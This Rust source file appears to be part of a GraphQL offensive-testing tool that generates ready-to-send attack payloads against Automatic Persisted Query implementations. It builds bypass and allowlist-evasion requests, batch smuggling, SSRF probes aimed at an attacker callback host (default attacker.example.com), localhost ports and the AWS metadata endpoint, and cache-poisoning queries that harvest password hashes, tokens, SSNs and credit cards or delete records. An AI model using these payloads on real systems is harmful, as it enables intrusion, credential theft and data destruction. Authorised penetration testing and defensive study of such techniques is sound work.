use sha2::{Digest, Sha256};

/// Maximum number of hashes to test in a single batch APQ request.
pub const MAX_BATCH_HASHES: usize = 128;

/// Maximum number of common query patterns to generate hashes for.
const MAX_QUERY_PATTERNS: usize = 512;

/// APQ protocol version used in the `extensions` field.
const APQ_VERSION: u8 = 1;

// ─── APQ Detection ──────────────────────────────────────────────────────────

/// Result of probing a target for APQ support.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ApqProbeResult {
    /// Whether the server recognized the `persistedQuery` extension at all.
    pub apq_recognized: bool,
    /// Whether the server returned `PERSISTED_QUERY_NOT_FOUND` (confirms APQ is active).
    pub persisted_query_not_found: bool,
    /// Whether the server returned a result for a hash-only request (query registered).
    pub hash_hit: bool,
    /// Raw error code from the response, if any.
    pub error_code: Option<String>,
    /// Server implementation hint extracted from error formatting.
    pub server_hint: Option<ApqServerHint>,
}

/// Hints about the GraphQL server implementation derived from APQ error formatting.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApqServerHint {
    /// Apollo Server (Node.js) — uses `PERSISTED_QUERY_NOT_FOUND` error code.
    ApolloServer,
    /// Relay-compatible server — uses `PersistedQueryNotFound` error code.
    RelayCompat,
    /// Hasura — returns specific error structure.
    Hasura,
    /// Generic server — APQ recognized but implementation unclear.
    Generic,
}

/// Build the JSON payload for an APQ probe request.
///
/// Sends only the hash (no query body) to test whether APQ is active.
/// A `PERSISTED_QUERY_NOT_FOUND` response confirms APQ support.
pub fn build_apq_probe_payload(query: &str) -> String {
    let hash = compute_apq_hash(query);
    format!(
        r#"{{"extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{hash}"}}}}}}"#
    )
}

/// Build a full APQ registration payload: query body + hash.
///
/// First request sends both to register the query; subsequent requests
/// can use hash-only.
pub fn build_apq_register_payload(query: &str) -> String {
    let hash = compute_apq_hash(query);
    let escaped_query = query.replace('\\', "\\\\").replace('"', "\\\"");
    format!(
        r#"{{"query":"{escaped_query}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{hash}"}}}}}}"#
    )
}

/// Compute the SHA256 hash of a query string for APQ.
///
/// Apollo APQ uses the literal SHA256 hex digest of the query text,
/// including whitespace.
pub fn compute_apq_hash(query: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(query.as_bytes());
    let result = hasher.finalize();
    hex_encode(&result)
}

fn hex_encode(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        out.push_str(&format!("{b:02x}"));
    }
    out
}

/// Analyze a GraphQL JSON response to determine APQ support.
///
/// Examines error codes and message patterns from multiple server implementations.
pub fn analyze_apq_response(response_body: &str) -> ApqProbeResult {
    let lower = response_body.to_lowercase();

    let persisted_query_not_found = lower.contains("persisted_query_not_found")
        || lower.contains("persistedquerynotfound")
        || lower.contains("persisted query not found");

    let has_data = lower.contains("\"data\"") && !lower.contains("\"data\":null");
    let has_errors = lower.contains("\"errors\"");
    let apq_recognized = persisted_query_not_found || has_data || {
        has_errors
            && (lower.contains("persistedquery")
                || lower.contains("persisted_query")
                || lower.contains("persisted query"))
    };

    let error_code = extract_error_code(response_body);
    let server_hint = detect_server_hint(response_body);

    ApqProbeResult {
        apq_recognized,
        persisted_query_not_found,
        hash_hit: has_data && !has_errors,
        error_code,
        server_hint,
    }
}

fn extract_error_code(body: &str) -> Option<String> {
    let code_markers = [(r#""code":""#, '"'), (r#""code": ""#, '"')];
    for (prefix, delim) in &code_markers {
        if let Some(pos) = body.find(prefix) {
            let start = pos + prefix.len();
            let tail = &body[start..];
            if let Some(end) = tail.find(*delim) {
                let code = &tail[..end];
                if !code.is_empty() && code.len() <= 64 {
                    return Some(code.to_string());
                }
            }
        }
    }
    None
}

fn detect_server_hint(body: &str) -> Option<ApqServerHint> {
    let lower = body.to_lowercase();
    if lower.contains("persisted_query_not_found") {
        Some(ApqServerHint::ApolloServer)
    } else if lower.contains("persistedquerynotfound") {
        Some(ApqServerHint::RelayCompat)
    } else if lower.contains("\"path\"")
        && lower.contains("\"extensions\"")
        && lower.contains("hasura")
    {
        Some(ApqServerHint::Hasura)
    } else if lower.contains("persisted query") || lower.contains("persistedquery") {
        Some(ApqServerHint::Generic)
    } else {
        None
    }
}

// ─── Hash Enumeration ───────────────────────────────────────────────────────

/// Common GraphQL query patterns whose hashes are likely registered on production servers.
///
/// These patterns cover introspection, standard CRUD, authentication flows,
/// and framework-generated queries (Relay, Apollo Client, urql).
pub const COMMON_QUERY_PATTERNS: &[&str] = &[
    "{ __typename }",
    "{ __schema { types { name } } }",
    "{ __schema { queryType { name } mutationType { name } } }",
    "query { viewer { id } }",
    "query { viewer { id email } }",
    "query { me { id } }",
    "query { me { id email name } }",
    "query { currentUser { id } }",
    "query { currentUser { id email } }",
    "query { node(id: $id) { id } }",
    "query { users { edges { node { id } } } }",
    "query { users { id name email } }",
    "query { user(id: $id) { id name email } }",
    "mutation { login(email: $email, password: $password) { token } }",
    "mutation { signIn(input: $input) { token user { id } } }",
    "mutation { createUser(input: $input) { user { id } } }",
    "mutation { updateUser(input: $input) { user { id } } }",
    "mutation { deleteUser(id: $id) { success } }",
    "query { posts { id title body } }",
    "query { post(id: $id) { id title body author { name } } }",
    "query { products { id name price } }",
    "query { orders { id status total } }",
    "query { search(query: $query) { ... on User { id name } ... on Post { id title } } }",
    "{ __type(name: \"User\") { fields { name type { name } } } }",
    "{ __type(name: \"Query\") { fields { name } } }",
    "{ __type(name: \"Mutation\") { fields { name } } }",
    "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }",
    "query { __schema { types { name kind } } }",
    "query { __schema { directives { name args { name } } } }",
    "query { health }",
    "query { status }",
    "query { ping }",
    "query { version }",
    "query { config { features } }",
    "query { settings { id key value } }",
    "query { notifications { id message read } }",
    "mutation { refreshToken(token: $token) { token expiresAt } }",
    "mutation { logout { success } }",
    "mutation { resetPassword(email: $email) { success } }",
    "subscription { onMessage { id body sender { name } } }",
    "subscription { onNotification { id message } }",
];

/// A hash probe targeting a specific query pattern.
#[derive(Debug, Clone)]
pub struct HashProbe {
    /// SHA256 hash of the query.
    pub hash: String,
    /// The original query pattern that produced this hash.
    pub query_pattern: String,
    /// JSON payload to send (hash-only, no query body).
    pub payload: String,
}

/// Result of APQ hash enumeration across multiple probes.
#[derive(Debug, Clone)]
pub struct HashEnumerationResult {
    /// Hashes that returned data (registered queries found).
    pub hits: Vec<HashProbe>,
    /// Hashes that returned PERSISTED_QUERY_NOT_FOUND (valid protocol, unregistered).
    pub misses: usize,
    /// Total probes sent.
    pub total_probed: usize,
    /// Unique query patterns discovered.
    pub discovered_queries: Vec<String>,
}

/// Generate hash probes for all common query patterns.
///
/// Each probe contains the precomputed SHA256 hash and a ready-to-send
/// JSON payload using the APQ extension format.
pub fn generate_hash_probes() -> Vec<HashProbe> {
    COMMON_QUERY_PATTERNS
        .iter()
        .take(MAX_QUERY_PATTERNS)
        .map(|pattern| {
            let hash = compute_apq_hash(pattern);
            let payload = format!(
                r#"{{"extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{hash}"}}}}}}"#
            );
            HashProbe {
                hash,
                query_pattern: pattern.to_string(),
                payload,
            }
        })
        .collect()
}

/// Generate hash probes from custom query strings beyond the built-in patterns.
pub fn generate_custom_hash_probes(queries: &[&str]) -> Vec<HashProbe> {
    queries
        .iter()
        .take(MAX_QUERY_PATTERNS)
        .map(|q| {
            let hash = compute_apq_hash(q);
            let payload = format!(
                r#"{{"extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{hash}"}}}}}}"#
            );
            HashProbe {
                hash,
                query_pattern: q.to_string(),
                payload,
            }
        })
        .collect()
}

/// Process responses from hash enumeration probes.
///
/// `probe_responses` pairs each `HashProbe` with the server's response body.
pub fn process_hash_enumeration(probe_responses: &[(&HashProbe, &str)]) -> HashEnumerationResult {
    let mut hits = Vec::new();
    let mut misses = 0;
    let mut discovered = Vec::new();

    for (probe, response) in probe_responses {
        let result = analyze_apq_response(response);
        if result.hash_hit {
            hits.push((*probe).clone());
            discovered.push(probe.query_pattern.clone());
        } else if result.persisted_query_not_found {
            misses += 1;
        }
    }

    HashEnumerationResult {
        total_probed: probe_responses.len(),
        hits,
        misses,
        discovered_queries: discovered,
    }
}

// ─── Persisted Query Bypass Techniques ──────────────────────────────────────

/// Technique for bypassing persisted query restrictions.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BypassTechnique {
    /// Send query body alongside the persisted query hash — tests if server
    /// ignores the hash and executes the body directly.
    QueryBodyOverride,
    /// Register a new query via APQ auto-registration then use it by hash.
    ApqAutoRegister,
    /// Use field aliases to reshape a permitted query into one that returns
    /// additional data.
    FieldAliasReshape,
    /// Abuse fragment spreading to inject additional selections into an
    /// allowed query pattern.
    FragmentInjection,
    /// Send a batch (array) of operations where one uses a valid persisted hash
    /// and another carries an arbitrary query.
    BatchSmuggling,
    /// Manipulate whitespace/comments in a query to change its hash while
    /// keeping the same semantic meaning.
    HashCollisionWhitespace,
    /// Use `__typename` and introspection fields inside allowed queries
    /// to leak schema information.
    IntrospectionPiggyback,
}

/// A generated bypass payload with metadata.
#[derive(Debug, Clone)]
pub struct BypassPayload {
    /// JSON request body to send.
    pub payload: String,
    /// Which bypass technique this represents.
    pub technique: BypassTechnique,
    /// Human-readable description for reporting.
    pub description: String,
}

/// Generate bypass payloads that attempt to circumvent persisted query restrictions.
///
/// Takes an optional known-valid hash for techniques that piggyback on registered queries.
/// `injection_query` is the arbitrary query the attacker wants to execute.
pub fn generate_bypass_payloads(
    known_valid_hash: Option<&str>,
    injection_query: &str,
) -> Vec<BypassPayload> {
    let mut payloads = Vec::new();
    let escaped = injection_query.replace('\\', "\\\\").replace('"', "\\\"");
    let injection_hash = compute_apq_hash(injection_query);

    // Technique 1: QueryBodyOverride — send query body + hash, see if body wins
    {
        let payload = format!(
            r#"{{"query":"{escaped}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{injection_hash}"}}}}}}"#
        );
        payloads.push(BypassPayload {
            payload,
            technique: BypassTechnique::QueryBodyOverride,
            description:
                "Send query body alongside APQ hash to test if server executes body directly"
                    .to_string(),
        });
    }

    // Technique 2: APQ auto-register — register then fetch by hash
    {
        let register = build_apq_register_payload(injection_query);
        payloads.push(BypassPayload {
            payload: register,
            technique: BypassTechnique::ApqAutoRegister,
            description: "Register arbitrary query via APQ auto-registration extension".to_string(),
        });
    }

    // Technique 3: FieldAliasReshape — wrap in aliases to change shape
    {
        let aliased = "{ exfil: __typename leaked: __schema { types { name } } }".to_string();
        let alias_hash = compute_apq_hash(&aliased);
        let payload = format!(
            r#"{{"query":"{aliased_escaped}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{alias_hash}"}}}}}}"#,
            aliased_escaped = aliased.replace('"', "\\\"")
        );
        payloads.push(BypassPayload {
            payload,
            technique: BypassTechnique::FieldAliasReshape,
            description: "Use field aliases to reshape query and extract schema data".to_string(),
        });
    }

    // Technique 4: FragmentInjection — inject selections via fragment
    {
        let fragment_query = "query Probe { __typename ...Leak } fragment Leak on Query { __schema { types { name } } }".to_string();
        let frag_hash = compute_apq_hash(&fragment_query);
        let frag_escaped = fragment_query.replace('"', "\\\"");
        let payload = format!(
            r#"{{"query":"{frag_escaped}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{frag_hash}"}}}}}}"#
        );
        payloads.push(BypassPayload {
            payload,
            technique: BypassTechnique::FragmentInjection,
            description: "Inject additional selections via named fragment spreading".to_string(),
        });
    }

    // Technique 5: BatchSmuggling — batch with valid + malicious
    if let Some(valid_hash) = known_valid_hash {
        let payload = format!(
            r#"[{{"extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{valid_hash}"}}}}}},{{"query":"{escaped}"}}]"#
        );
        payloads.push(BypassPayload {
            payload,
            technique: BypassTechnique::BatchSmuggling,
            description: "Batch array: valid persisted hash + arbitrary query in single request"
                .to_string(),
        });
    }

    // Technique 6: HashCollisionWhitespace — semantically identical, different hash
    {
        let with_comments = format!("# bypass\n{injection_query}\n# end");
        let comment_hash = compute_apq_hash(&with_comments);
        let comment_escaped = with_comments
            .replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace('\n', "\\n");
        let payload = format!(
            r#"{{"query":"{comment_escaped}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{comment_hash}"}}}}}}"#
        );
        payloads.push(BypassPayload {
            payload,
            technique: BypassTechnique::HashCollisionWhitespace,
            description: "Add comments/whitespace to change hash while preserving query semantics"
                .to_string(),
        });
    }

    // Technique 7: IntrospectionPiggyback
    {
        let piggyback = "{ __typename __schema { queryType { name } mutationType { name } subscriptionType { name } } }";
        let pig_hash = compute_apq_hash(piggyback);
        let pig_escaped = piggyback.replace('"', "\\\"");
        let payload = format!(
            r#"{{"query":"{pig_escaped}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{pig_hash}"}}}}}}"#
        );
        payloads.push(BypassPayload {
            payload,
            technique: BypassTechnique::IntrospectionPiggyback,
            description: "Piggyback introspection fields inside a minimal query for schema leakage"
                .to_string(),
        });
    }

    payloads
}

// ─── Allowlist Bypass ───────────────────────────────────────────────────────

/// Technique for bypassing query allowlists.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AllowlistBypassTechnique {
    /// Use aliases to request the same allowed field under different names,
    /// extracting data the allowlist didn't intend to expose.
    AliasEnumeration,
    /// Inject inline fragments to widen the selection set beyond what the
    /// allowlisted query specified.
    InlineFragmentWidening,
    /// Spread a named fragment that selects restricted fields.
    NamedFragmentSpread,
    /// Use `__typename` meta-field to probe for types without triggering
    /// field-level allowlist checks.
    TypenameProbe,
    /// Combine multiple allowed queries in a single document to access
    /// data across allowlist boundaries.
    MultiOperationMerge,
}

/// A generated allowlist bypass payload.
#[derive(Debug, Clone)]
pub struct AllowlistBypassPayload {
    /// GraphQL query string.
    pub query: String,
    /// JSON request payload.
    pub payload: String,
    /// Technique used.
    pub technique: AllowlistBypassTechnique,
    /// Human-readable description.
    pub description: String,
}

/// Generate allowlist bypass payloads from a known-allowed query and target fields.
///
/// `allowed_query` is a query known to pass the allowlist.
/// `target_type` is the type on which restricted fields live.
/// `restricted_fields` are fields the attacker wants to access.
pub fn generate_allowlist_bypasses(
    allowed_query: &str,
    target_type: &str,
    restricted_fields: &[&str],
) -> Vec<AllowlistBypassPayload> {
    let mut payloads = Vec::new();

    if restricted_fields.is_empty() {
        return payloads;
    }

    // Technique 1: AliasEnumeration
    {
        let aliases: Vec<String> = restricted_fields
            .iter()
            .enumerate()
            .map(|(i, f)| format!("a{i}: {f}"))
            .collect();
        let query = format!(
            "{{ {target_type} {{ {allowed_fields} {aliases} }} }}",
            allowed_fields = "__typename",
            aliases = aliases.join(" ")
        );
        let hash = compute_apq_hash(&query);
        let escaped = query.replace('"', "\\\"");
        let payload = format!(
            r#"{{"query":"{escaped}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{hash}"}}}}}}"#
        );
        payloads.push(AllowlistBypassPayload {
            query,
            payload,
            technique: AllowlistBypassTechnique::AliasEnumeration,
            description: "Alias restricted fields alongside allowed __typename selection"
                .to_string(),
        });
    }

    // Technique 2: InlineFragmentWidening
    {
        let inline_fields: Vec<String> = restricted_fields.iter().map(|f| f.to_string()).collect();
        let query = format!(
            "{{ {target_type} {{ __typename ... on {target_type} {{ {fields} }} }} }}",
            fields = inline_fields.join(" ")
        );
        let hash = compute_apq_hash(&query);
        let escaped = query.replace('"', "\\\"");
        let payload = format!(
            r#"{{"query":"{escaped}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{hash}"}}}}}}"#
        );
        payloads.push(AllowlistBypassPayload {
            query,
            payload,
            technique: AllowlistBypassTechnique::InlineFragmentWidening,
            description: "Widen selection via inline fragment on same type".to_string(),
        });
    }

    // Technique 3: NamedFragmentSpread
    {
        let frag_fields: Vec<String> = restricted_fields.iter().map(|f| f.to_string()).collect();
        let query = format!(
            "{{ {target_type} {{ __typename ...RestrictedFields }} }} fragment RestrictedFields on {target_type} {{ {fields} }}",
            fields = frag_fields.join(" ")
        );
        let hash = compute_apq_hash(&query);
        let escaped = query.replace('"', "\\\"");
        let payload = format!(
            r#"{{"query":"{escaped}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{hash}"}}}}}}"#
        );
        payloads.push(AllowlistBypassPayload {
            query,
            payload,
            technique: AllowlistBypassTechnique::NamedFragmentSpread,
            description: "Spread named fragment to inject restricted field selections".to_string(),
        });
    }

    // Technique 4: TypenameProbe
    {
        let typename_probes: Vec<String> = restricted_fields
            .iter()
            .enumerate()
            .map(|(i, f)| format!("t{i}: {f} {{ __typename }}"))
            .collect();
        let query = format!(
            "{{ {target_type} {{ {probes} }} }}",
            probes = typename_probes.join(" ")
        );
        let hash = compute_apq_hash(&query);
        let escaped = query.replace('"', "\\\"");
        let payload = format!(
            r#"{{"query":"{escaped}","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{hash}"}}}}}}"#
        );
        payloads.push(AllowlistBypassPayload {
            query,
            payload,
            technique: AllowlistBypassTechnique::TypenameProbe,
            description: "Probe restricted fields via __typename sub-selections".to_string(),
        });
    }

    // Technique 5: MultiOperationMerge
    {
        let escaped_allowed = allowed_query.replace('"', "\\\"");
        let extra_fields: Vec<String> = restricted_fields.iter().map(|f| f.to_string()).collect();
        let query = format!(
            "query Allowed {{ {target_type} {{ __typename }} }} query Exfil {{ {target_type} {{ {fields} }} }}",
            fields = extra_fields.join(" ")
        );
        let hash = compute_apq_hash(&query);
        let escaped = query.replace('"', "\\\"");
        let _ = escaped_allowed;
        let payload = format!(
            r#"{{"query":"{escaped}","operationName":"Exfil","extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{hash}"}}}}}}"#
        );
        payloads.push(AllowlistBypassPayload {
            query,
            payload,
            technique: AllowlistBypassTechnique::MultiOperationMerge,
            description: "Merge allowed and exfiltration queries in multi-operation document"
                .to_string(),
        });
    }

    payloads
}

// ─── Batch APQ Enumeration ──────────────────────────────────────────────────

/// A batch APQ request containing multiple hash probes.
#[derive(Debug, Clone)]
pub struct BatchApqRequest {
    /// JSON array payload with multiple APQ operations.
    pub payload: String,
    /// Number of hashes in this batch.
    pub hash_count: usize,
    /// The hashes included in order.
    pub hashes: Vec<String>,
}

/// Build a batch APQ request from multiple hash probes.
///
/// Constructs a JSON array where each element is an APQ hash-only request.
/// Servers supporting batched GraphQL requests will process all hashes in
/// a single round-trip.
pub fn build_batch_apq_request(probes: &[HashProbe]) -> BatchApqRequest {
    let capped = &probes[..probes.len().min(MAX_BATCH_HASHES)];
    let elements: Vec<String> = capped
        .iter()
        .map(|p| {
            format!(
                r#"{{"extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"{}"}}}}}}"#,
                p.hash
            )
        })
        .collect();
    let hashes: Vec<String> = capped.iter().map(|p| p.hash.clone()).collect();
    let payload = format!("[{}]", elements.join(","));
    BatchApqRequest {
        payload,
        hash_count: capped.len(),
        hashes,
    }
}

/// Parse a batch APQ response (JSON array) and identify which indices returned data.
///
/// Returns indices into the original probe array where the server returned
/// a non-error data response.
pub fn parse_batch_apq_response(response_body: &str, batch_size: usize) -> Vec<usize> {
    let mut hits = Vec::new();

    let trimmed = response_body.trim();
    if !trimmed.starts_with('[') {
        return hits;
    }

    let mut depth = 0i32;
    let mut element_start = None;
    let mut element_idx = 0usize;

    for (i, ch) in trimmed.char_indices() {
        match ch {
            '[' if depth == 0 => {
                depth = 1;
                element_start = Some(i + 1);
            }
            '{' => {
                if depth == 1 && element_start.is_some() {
                    element_start = Some(i);
                }
                depth += 1;
            }
            '}' => {
                depth -= 1;
                if depth == 1
                    && let Some(start) = element_start
                {
                    let element = &trimmed[start..=i];
                    let lower = element.to_lowercase();
                    let has_data = lower.contains("\"data\"") && !lower.contains("\"data\":null");
                    let has_error = lower.contains("persisted_query_not_found")
                        || lower.contains("persistedquerynotfound");
                    if has_data && !has_error && element_idx < batch_size {
                        hits.push(element_idx);
                    }
                    element_idx += 1;
                    element_start = None;
                }
            }
            ',' if depth == 1 => {
                element_start = Some(i + 1);
            }
            ']' if depth == 1 => {
                break;
            }
            _ => {}
        }
    }

    hits
}

// ─── APQ + SSRF ─────────────────────────────────────────────────────────────

/// An SSRF probe payload using APQ mechanics.
#[derive(Debug, Clone)]
pub struct ApqSsrfProbe {
    /// JSON request payload.
    pub payload: String,
    /// Target URL the server might fetch.
    pub target_url: String,
    /// Description of the SSRF vector.
    pub description: String,
}

/// Generate APQ-based SSRF probes.
///
/// Some persisted query implementations fetch query documents from external
/// URLs. These probes test whether the server can be tricked into making
/// server-side requests to attacker-controlled or internal endpoints.
pub fn generate_apq_ssrf_probes(callback_url: &str) -> Vec<ApqSsrfProbe> {
    let mut probes = Vec::new();

    // Probe 1: extensions.persistedQuery.url field (non-standard extension)
    {
        let payload = format!(
            r#"{{"extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"deadbeef","url":"{callback_url}/graphql/query"}}}}}}"#
        );
        probes.push(ApqSsrfProbe {
            payload,
            target_url: format!("{callback_url}/graphql/query"),
            description: "Inject URL in persistedQuery extension to trigger server-side fetch"
                .to_string(),
        });
    }

    // Probe 2: Custom CDN-like persisted query endpoint
    {
        let payload = format!(
            r#"{{"extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"deadbeef"}},"cdn":{{"url":"{callback_url}/cdn/queries"}}}}}}"#
        );
        probes.push(ApqSsrfProbe {
            payload,
            target_url: format!("{callback_url}/cdn/queries"),
            description: "Inject CDN URL extension to trigger server-side query document fetch"
                .to_string(),
        });
    }

    // Probe 3: Internal network probing via APQ hash referencing localhost
    for port in &[80, 443, 8080, 8443, 3000, 4000, 9090] {
        let internal_url = format!("http://127.0.0.1:{port}/graphql");
        let payload = format!(
            r#"{{"extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"deadbeef","endpoint":"{internal_url}"}}}}}}"#
        );
        probes.push(ApqSsrfProbe {
            payload,
            target_url: internal_url,
            description: format!(
                "Probe internal service on port {port} via APQ endpoint extension"
            ),
        });
    }

    // Probe 4: Cloud metadata SSRF
    {
        let metadata_url = "http://169.254.169.254/latest/meta-data/";
        let payload = format!(
            r#"{{"extensions":{{"persistedQuery":{{"version":{APQ_VERSION},"sha256Hash":"deadbeef","url":"{metadata_url}"}}}}}}"#
        );
        probes.push(ApqSsrfProbe {
            payload,
            target_url: metadata_url.to_string(),
            description: "Attempt AWS metadata endpoint access via APQ URL injection".to_string(),
        });
    }

    probes
}

// ─── Cache Poisoning ────────────────────────────────────────────────────────

/// A cache poisoning payload targeting APQ caches.
#[derive(Debug, Clone)]
pub struct CachePoisonPayload {
    /// First request: register the malicious query with its correct hash.
    pub register_payload: String,
    /// Second request: hash-only request to verify the cached entry.
    pub verify_payload: String,
    /// The hash that maps to the malicious query.
    pub hash: String,
    /// The malicious query being cached.
    pub malicious_query: String,
    /// Description of the poisoning scenario.
    pub description: String,
}

/// Generate APQ cache poisoning payloads.
///
/// These exploit the APQ auto-registration flow: a client sends `query + hash`,
/// the server caches `hash → query`, then subsequent requests with just the hash
/// execute the cached query. If registration is unauthenticated, an attacker can
/// register malicious queries that other clients may execute by hash.
pub fn generate_cache_poison_payloads(target_type: &str) -> Vec<CachePoisonPayload> {
    let mut payloads = Vec::new();

    let malicious_queries = vec![
        (
            format!(
                "query {{ {target_type} {{ id email passwordHash secretToken ssn creditCard }} }}"
            ),
            "Data exfiltration: register query selecting sensitive fields",
        ),
        (
            format!("mutation {{ delete{target_type}(id: \"*\") {{ success }} }}"),
            "Destructive mutation disguised as a query hash",
        ),
        (
            format!(
                "query {{ {target_type} {{ id }} __schema {{ types {{ name fields {{ name }} }} }} }}"
            ),
            "Schema introspection piggyback via cache-poisoned query",
        ),
    ];

    for (query, desc) in malicious_queries {
        let hash = compute_apq_hash(&query);
        let register = build_apq_register_payload(&query);
        let verify = build_apq_probe_payload(&query);

        payloads.push(CachePoisonPayload {
            register_payload: register,
            verify_payload: verify,
            hash,
            malicious_query: query,
            description: desc.to_string(),
        });
    }

    payloads
}

// ─── Aggregate Engine ───────────────────────────────────────────────────────

/// Full result of the persisted query attack engine.
#[derive(Debug)]
pub struct PersistedQueryAttackResult {
    pub apq_probe: Option<ApqProbeResult>,
    pub hash_probes: Vec<HashProbe>,
    pub bypass_payloads: Vec<BypassPayload>,
    pub allowlist_bypasses: Vec<AllowlistBypassPayload>,
    pub batch_requests: Vec<BatchApqRequest>,
    pub ssrf_probes: Vec<ApqSsrfProbe>,
    pub cache_poison_payloads: Vec<CachePoisonPayload>,
}

/// Configuration for the persisted query attack engine.
#[derive(Debug, Clone)]
pub struct PersistedQueryConfig {
    pub enable_apq_probe: bool,
    pub enable_hash_enumeration: bool,
    pub enable_bypass: bool,
    pub enable_allowlist_bypass: bool,
    pub enable_batch_apq: bool,
    pub enable_ssrf: bool,
    pub enable_cache_poison: bool,
    /// Known-valid persisted query hash for piggyback attacks.
    pub known_valid_hash: Option<String>,
    /// Query to attempt injection with.
    pub injection_query: String,
    /// Allowed query for allowlist bypass testing.
    pub allowed_query: Option<String>,
    /// Target type name for allowlist and cache poison testing.
    pub target_type: String,
    /// Restricted fields to target.
    pub restricted_fields: Vec<String>,
    /// Callback URL for SSRF probes.
    pub callback_url: Option<String>,
}

impl Default for PersistedQueryConfig {
    fn default() -> Self {
        Self {
            enable_apq_probe: true,
            enable_hash_enumeration: true,
            enable_bypass: true,
            enable_allowlist_bypass: true,
            enable_batch_apq: true,
            enable_ssrf: true,
            enable_cache_poison: true,
            known_valid_hash: None,
            injection_query: "{ __schema { types { name } } }".to_string(),
            allowed_query: None,
            target_type: "User".to_string(),
            restricted_fields: vec![
                "email".to_string(),
                "passwordHash".to_string(),
                "secretToken".to_string(),
            ],
            callback_url: None,
        }
    }
}

/// Run the full persisted query attack engine.
///
/// Generates payloads for all enabled attack categories. Does NOT make
/// network requests — the caller sends the generated payloads and feeds
/// responses back into analysis functions.
pub fn run_persisted_query_engine(
    config: &PersistedQueryConfig,
    apq_response: Option<&str>,
) -> PersistedQueryAttackResult {
    let apq_probe = apq_response.map(analyze_apq_response);

    let hash_probes = if config.enable_hash_enumeration {
        generate_hash_probes()
    } else {
        Vec::new()
    };

    let bypass_payloads = if config.enable_bypass {
        generate_bypass_payloads(config.known_valid_hash.as_deref(), &config.injection_query)
    } else {
        Vec::new()
    };

    let restricted_refs: Vec<&str> = config
        .restricted_fields
        .iter()
        .map(|s| s.as_str())
        .collect();
    let allowlist_bypasses = if config.enable_allowlist_bypass {
        let allowed = config.allowed_query.as_deref().unwrap_or("{ __typename }");
        generate_allowlist_bypasses(allowed, &config.target_type, &restricted_refs)
    } else {
        Vec::new()
    };

    let batch_requests = if config.enable_batch_apq && !hash_probes.is_empty() {
        hash_probes
            .chunks(MAX_BATCH_HASHES)
            .map(build_batch_apq_request)
            .collect()
    } else {
        Vec::new()
    };

    let ssrf_probes = if config.enable_ssrf {
        let url = config
            .callback_url
            .as_deref()
            .unwrap_or("https://attacker.example.com");
        generate_apq_ssrf_probes(url)
    } else {
        Vec::new()
    };

    let cache_poison_payloads = if config.enable_cache_poison {
        generate_cache_poison_payloads(&config.target_type)
    } else {
        Vec::new()
    };

    PersistedQueryAttackResult {
        apq_probe,
        hash_probes,
        bypass_payloads,
        allowlist_bypasses,
        batch_requests,
        ssrf_probes,
        cache_poison_payloads,
    }
}
